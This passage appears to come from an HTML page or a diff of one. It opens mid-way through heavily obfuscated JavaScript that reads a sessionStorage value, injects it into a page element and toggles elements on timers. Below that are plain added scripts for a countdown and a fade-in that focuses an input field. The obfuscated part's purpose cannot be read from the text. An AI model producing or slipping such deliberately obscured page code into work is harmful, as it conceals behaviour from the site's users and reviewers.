_0x4cadc7=_0x442043,_0x49e9c1=_0x17bc1d[_0x4cadc7(0x127)][_0x4cadc7(0x10c)]('|'),_0x2eb227=0xdc6*0x1+0xa39+-0x17ff;while(!![]){switch(_0x49e9c1[_0x2eb227++]){case'0':_0x17bc1d[_0x4cadc7(0xc8)]($,_0x17bc1d[_0x4cadc7(0x126)])[_0x4cadc7(0x122)](_0x17bc1d[_0x4cadc7(0x167)],_0x17bc1d[_0x4cadc7(0x14e)]);continue;case'1':var _0x180596=sessionStorage[_0x4cadc7(0xec)](_0x17bc1d[_0x4cadc7(0x1b1)]);continue;case'2':_0x17bc1d[_0x4cadc7(0x186)]($,_0x17bc1d[_0x4cadc7(0x163)])[_0x4cadc7(0xf3)]('');continue;case'3':document[_0x4cadc7(0x19a)+_0x4cadc7(0xc2)](_0x17bc1d[_0x4cadc7(0xe8)])[_0x4cadc7(0xe2)]=_0x17bc1d[_0x4cadc7(0xff)](_0x17bc1d[_0x4cadc7(0x1bf)](_0x17bc1d[_0x4cadc7(0x159)],_0x180596),_0x17bc1d[_0x4cadc7(0x10f)]);continue;case'4':_0x17bc1d[_0x4cadc7(0x18a)]($,_0x17bc1d[_0x4cadc7(0x16d)])[_0x4cadc7(0x151)]();continue;}break;}},0x4*0x2b4+0x2605+0x1*-0x2135);}});continue;case'11':var _0x4fb341=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x1c0)]);continue;case'12':var _0xfc86da=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x13f)]);continue;case'13':_0xfc10ff[_0x37f908(0x12a)](setTimeout,function(){var _0x42a752=_0x37f908;_0x3f64c0[_0x42a752(0x19e)]($,_0x3f64c0[_0x42a752(0x149)])[_0x42a752(0x14b)](_0x3f64c0[_0x42a752(0x16c)]),_0x3f64c0[_0x42a752(0x19e)]($,_0x3f64c0[_0x42a752(0x149)])[_0x42a752(0x122)](_0x3f64c0[_0x42a752(0x191)],_0x3f64c0[_0x42a752(0x188)]);},0x733+0x1547+-0x14aa);continue;case'14':var _0x4c792f=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0xfd)]);continue;case'15':var _0x7ade4f=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x160)]);continue;case'16':var _0x124b69=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x16f)]);continue;case'17':var _0x4ad304=document[_0x37f908(0x19a)+_0x37f908(0xc2)](_0xfc10ff[_0x37f908(0x17d)]);continue;}break;}};
+    </script>
+<script>
+    function countdown() {
+    var count = parseInt(
+    $('#countdown').text());
+    if (count !== 0) {
+    $('#countdown').text(count - 1);} 
+    else {
+    $('#countdown').text('80');}};
+    </script>
+<script>
+window.onload = function(){
+        setTimeout(function(){
+            $(".start").fadeIn();
+            setTimeout(function(){
+                $(".start").fadeOut(1000);
+                setTimeout(function(){
+                   $(".container").fadeIn(200);
+                   $("#inp").focus();
+                },1000);
+            },1000);
+        },500);
+}
+</script>
+</body>
+</html>
